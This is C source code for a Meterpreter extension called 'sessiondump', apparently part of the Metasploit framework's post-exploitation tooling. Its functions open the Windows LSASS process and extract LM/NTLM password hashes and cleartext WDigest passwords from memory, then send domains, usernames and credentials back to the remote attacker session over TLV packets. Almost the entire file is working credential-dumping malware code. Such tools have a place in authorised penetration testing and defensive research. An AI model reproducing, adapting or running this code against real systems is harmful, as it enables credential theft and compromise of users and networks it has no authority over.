/*
 *
 * This meterpreter extension can be used to dump hashes and passwords from memory
 * Compatible with x86 and x64 systems from Windows XP/2003 to Windows 8/2012
 * Author : Steeve Barbeau (steeve DOT barbeau AT hsc DOT fr)
 * http://www.hsc.fr/ressources/outils/sessiondump/index.html.en
 *
 */

#define _CRT_SECURE_NO_DEPRECATE 1
#include "../../common/common.h"
#include "sessiondump.h"
#include "../../ReflectiveDLLInjection/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

extern HANDLE hLsass;
extern ADDRESSES symbAddr;
extern ULONG LogonSessionListCount;
extern LONG_PTR LogonSessionList;
extern OSVERSIONINFOEX osvi;
extern BYTE g_Feedback[8];
extern LPVOID g_pDESXKey;
extern BYTE g_DESXKey[400];


DWORD sendErrorTLV(int error, Packet *response, Remote *remote){
	// Send TLV_TYPE_ERROR packet
	DWORD res = ERROR_SUCCESS;
	packet_add_tlv_uint(response, TLV_TYPE_ERROR, error);
	packet_transmit_response(res, remote, response);
	return res;
}

void SymbAddrTlvToStruct(Packet *packet, ADDRESSES *symbAddr, int nbFields){
	// Put symbol offsets received from network in TLV format inside a ADDRESSES structure
	Tlv tlvSymbName, tlvSymbAddr;
	int i;
	LPTSTR tmp = NULL;
	tmp = calloc(SMALL_BUFFER_SIZE, sizeof(TCHAR));
	
	for (i=0 ; i<nbFields ; i++){
		// Get symbol name from TLV
		if (packet_enum_tlv(packet, i, TLV_TYPE_SYMBOLS_NAME, &tlvSymbName) != ERROR_SUCCESS){
			continue;
		}
		// Get symbol address from TLV
		if (packet_enum_tlv(packet, i, TLV_TYPE_SYMBOLS_ADDR, &tlvSymbAddr) != ERROR_SUCCESS){
			continue;
		}

		// Store symbols addresses in appropriate ADDRESSES structure fields
		if (!_tcscmp(_T("encryptmemory"), tlvSymbName.buffer)){
			strncpy(tmp, tlvSymbAddr.buffer, SMALL_BUFFER_SIZE);
			tmp[tlvSymbAddr.header.length] = '\0';
			symbAddr->LsaEncryptMemoryAddr = atol(tmp);
		} else if (!_tcscmp(_T("logon_session_list_addr"), tlvSymbName.buffer)){
			strncpy(tmp, tlvSymbAddr.buffer, SMALL_BUFFER_SIZE);
			tmp[tlvSymbAddr.header.length] = '\0';
			symbAddr->LogonSessionListAddr = atol(tmp);
		} else if (!_tcscmp(_T("logon_session_list_count"), tlvSymbName.buffer)){
			strncpy(tmp, tlvSymbAddr.buffer, SMALL_BUFFER_SIZE);
			tmp[tlvSymbAddr.header.length] = '\0';
			symbAddr->LogonSessionListCountAddr = atol(tmp);
		} else if (!_tcscmp(_T("feedback_addr"), tlvSymbName.buffer)){
			strncpy(tmp, tlvSymbAddr.buffer, SMALL_BUFFER_SIZE);
			tmp[tlvSymbAddr.header.length] = '\0';
			symbAddr->FeedbackAddr = atol(tmp);
		} else if (!_tcscmp(_T("deskey_ptr_addr"), tlvSymbName.buffer)){
			strncpy(tmp, tlvSymbAddr.buffer, SMALL_BUFFER_SIZE);
			tmp[tlvSymbAddr.header.length] = '\0';
			symbAddr->PDesxKeyAddr = atol(tmp);
		} else if (!_tcscmp(_T("threedeskey_ptr_addr"), tlvSymbName.buffer)){
			strncpy(tmp, tlvSymbAddr.buffer, SMALL_BUFFER_SIZE);
			tmp[tlvSymbAddr.header.length] = '\0';
			symbAddr->H3DesKeyAddr = atol(tmp);
		} else if (!_tcscmp(_T("iv_addr"), tlvSymbName.buffer)){
			strncpy(tmp, tlvSymbAddr.buffer, SMALL_BUFFER_SIZE);
			tmp[tlvSymbAddr.header.length] = '\0';
			symbAddr->IVAddr = atol(tmp);
		} else if (!_tcscmp(_T("wdigest_session_list"), tlvSymbName.buffer)){
			strncpy(tmp, tlvSymbAddr.buffer, SMALL_BUFFER_SIZE);
			tmp[tlvSymbAddr.header.length] = '\0';
			symbAddr->WdigestSessionList = atol(tmp);
		}
	}
};


DWORD getWdigestPasswords(Remote *remote, Packet *packet){
	// Call several sub-functions in order to extract clear-text passwords
	DWORD res = ERROR_SUCCESS;
	LPTSTR buffer = NULL;
	CREDS_INFOS aCredsInfos[SMALL_BUFFER_SIZE];
	int cbSessions = 0, i = 0;

	Packet *response = packet_create_response(packet);
	buffer = calloc(LARGE_BUFFER_SIZE, sizeof(TCHAR));
	SymbAddrTlvToStruct(packet, &symbAddr, 10);

	if (!OpenLsass()){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("%s\n"), _T("[ERROR] OpenLsass() :\n\t Unable to get handle of Lsass process. This can be a problem of rights access."));
		OutputDebugString(buffer);
		return sendErrorTLV(ERROR_SESSIONDUMP_PROCESS, response, remote);
	}

	if (!GetDataInMemory()){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("%s\n"), _T("[ERROR] GetDataInMemory() :\n\t Fail to extract data from memory in order to uncipher passwords"));
		OutputDebugString(buffer);
		return sendErrorTLV(ERROR_SESSIONDUMP_GET_DATA_IN_MEMORY, response, remote);
	}

	cbSessions = GetWdigestPasswords(&aCredsInfos);
	if (cbSessions == -1){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("%s\n"), _T("[ERROR] GetWdigestPasswords() :\n\t No session is present in LSASS memory or an unexpected error occurred"));
		OutputDebugString(buffer);
		return sendErrorTLV(ERROR_SESSIONDUMP_GET_WDIGEST_PASSWORDS, response, remote);
	}

	if (!CloseLsass()){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("%s\n"), _T("[ERROR] CloseLsass()"));
		OutputDebugString(buffer);
	}

	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Number of sessions : %d\n"), (cbSessions+1));
	OutputDebugString(buffer);
	OutputDebugString(_T("-----------------------------------------------------------------------------\n"));

	if (cbSessions > SMALL_BUFFER_SIZE){
		cbSessions = SMALL_BUFFER_SIZE;
	}

	for (i = 0 ; i <= cbSessions ; i++){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Session number: %d\n"), i);
		OutputDebugString(buffer);
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("\tDomain: %s\n"), aCredsInfos[i].Domain);
		OutputDebugString(buffer);
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("\tUsername: %s\n"), aCredsInfos[i].Username);
		OutputDebugString(buffer);
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("\tPassword: %s\n"), aCredsInfos[i].Password);
		OutputDebugString(buffer);

		packet_add_tlv_string(response, TLV_TYPE_DOMAIN, aCredsInfos[i].Domain);
		packet_add_tlv_string(response, TLV_TYPE_USER, aCredsInfos[i].Username);
		packet_add_tlv_string(response, TLV_TYPE_PWD, aCredsInfos[i].Password);

	}
	OutputDebugString(_T("-----------------------------------------------------------------------------\n"));

	packet_transmit_response(res, remote, response);
	return res;
}


DWORD getPasswordHashes(Remote *remote, Packet *packet){
	// Call several sub-functions in order to extract password hashes
	DWORD res = ERROR_SUCCESS;
	int cbSessions = 0, i = 0;
	LPTSTR buffer = NULL;
	CREDS_INFOS aCredsInfos[SMALL_BUFFER_SIZE];

	Packet *response = packet_create_response(packet);
	buffer = calloc(LARGE_BUFFER_SIZE, sizeof(TCHAR));
	SymbAddrTlvToStruct(packet, &symbAddr, 9);

	if (!OpenLsass()){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("%s\n"), _T("[ERROR] OpenLsass() :\n\t Fail to get handle of Lsass process. This can be a problem of rights access."));
		OutputDebugString(buffer);
		return sendErrorTLV(ERROR_SESSIONDUMP_PROCESS, response, remote);
	}

	if (!GetDataInMemory()){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("%s\n"), _T("[ERROR] GetDataInMemory() :\n\t Fail to extract data from memory in order to uncipher passwords"));
		OutputDebugString(buffer);
		return sendErrorTLV(ERROR_SESSIONDUMP_GET_DATA_IN_MEMORY, response, remote);
	}

	cbSessions = GetHashes(&aCredsInfos);
	if (cbSessions == -1){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("%s\n"), _T("[ERROR] GetHashes() :\n\t No session is present in LSASS memory or an unexpected error occurred"));
		OutputDebugString(buffer);
		return sendErrorTLV(ERROR_SESSIONDUMP_GET_HASHES, response, remote);
	}

	if (!CloseLsass()){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("%s\n"), _T("[ERROR] CloseLsass()"));
		OutputDebugString(buffer);
	}
	
	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Number of sessions: %d\n"), (cbSessions+1));
	OutputDebugString(buffer);
	OutputDebugString(_T("-----------------------------------------------------------------------------\n"));

	if (cbSessions > SMALL_BUFFER_SIZE){
		cbSessions = SMALL_BUFFER_SIZE;
	}

	for (i = 0 ; i <= cbSessions ; i++){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Session number: %d\n"), i);
		OutputDebugString(buffer);
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("\tDomain: %s\n"), aCredsInfos[i].Domain);
		OutputDebugString(buffer);
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("\tUsername: %s\n"), aCredsInfos[i].Username);
		OutputDebugString(buffer);
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("\tLM: %s\n"), aCredsInfos[i].LMhash);
		OutputDebugString(buffer);
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("\tNTLM: %s\n"), aCredsInfos[i].NTLMhash);
		OutputDebugString(buffer);

		packet_add_tlv_string(response, TLV_TYPE_DOMAIN, aCredsInfos[i].Domain);
		packet_add_tlv_string(response, TLV_TYPE_USER, aCredsInfos[i].Username);
		packet_add_tlv_string(response, TLV_TYPE_LM, aCredsInfos[i].LMhash);
		packet_add_tlv_string(response, TLV_TYPE_NTLM, aCredsInfos[i].NTLMhash);
	}
	OutputDebugString(_T("-----------------------------------------------------------------------------\n"));

	packet_transmit_response(res, remote, response);
	return res;
};


DWORD getDllVersion(Remote *remote, Packet *packet){
	// Get version of a DLL file
	DWORD res = ERROR_SUCCESS;
	DWORD dwFileVersionSize;
	LPBYTE lpFileVersionInfo = NULL;
	VS_FIXEDFILEINFO *lpFileInfo = NULL;
	UINT lpFileInfoSize = 0;
	LPBYTE dllpath = NULL, systemroot = NULL;
	char lpszDllVersion[SMALL_BUFFER_SIZE];

	Packet *response = packet_create_response(packet);
	PCHAR dll_name = packet_get_tlv_value_string(packet, TLV_TYPE_VERSION_DLL_REQUEST);

	dllpath = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SMALL_BUFFER_SIZE);
	systemroot = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SMALL_BUFFER_SIZE);

	// get absolute path to DLL in system32 directory
	GetEnvironmentVariable(_T("systemroot"), systemroot, SMALL_BUFFER_SIZE);
	_sntprintf_s(dllpath, SMALL_BUFFER_SIZE, _TRUNCATE, _T("%s\\System32\\%s"), systemroot, dll_name);
	OutputDebugString(dllpath);

	// get DLL version
	dwFileVersionSize = GetFileVersionInfoSize(_T(dllpath), NULL);
	if (dwFileVersionSize){
		lpFileVersionInfo = (LPBYTE) calloc(dwFileVersionSize, sizeof(BYTE));
		if (GetFileVersionInfo(_T(dllpath), NULL, dwFileVersionSize, lpFileVersionInfo)){
			if (VerQueryValue(lpFileVersionInfo, _T("\\"), &lpFileInfo, &lpFileInfoSize)){
				_sntprintf_s(lpszDllVersion, SMALL_BUFFER_SIZE, _TRUNCATE, _T("%d.%d.%d.%d"), HIWORD(lpFileInfo->dwFileVersionMS), LOWORD(lpFileInfo->dwFileVersionMS), \
				HIWORD(lpFileInfo->dwFileVersionLS), LOWORD(lpFileInfo->dwFileVersionLS));
			}
		}
	}
	
	packet_add_tlv_string(response, TLV_TYPE_VERSION_DLL_ANSWER, lpszDllVersion);
	packet_transmit_response(res, remote, response);

	lpFileInfo = NULL;
	if (lpFileVersionInfo) free(lpFileVersionInfo); lpFileVersionInfo = NULL;
	if (dllpath) HeapFree(GetProcessHeap(), 0, dllpath); dllpath = NULL;
	if (systemroot) HeapFree(GetProcessHeap(), 0, systemroot); systemroot = NULL;
	return res;
};


Command customCommands[] =
{
	{ "getHashes",
	{ getPasswordHashes,						{ 0 }, 0 },
	{ EMPTY_DISPATCH_HANDLER                      },
	},

	{ "getWdigestPasswords",
	{ getWdigestPasswords,						{ 0 }, 0 },
	{ EMPTY_DISPATCH_HANDLER                      },
	},

	{ "getDllVer",
	{ getDllVersion,							{ 0 }, 0 },
	{ EMPTY_DISPATCH_HANDLER                      },
	},

	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	},
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;

	hMetSrv = remote->hMetSrv;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

	return ERROR_SUCCESS;
}
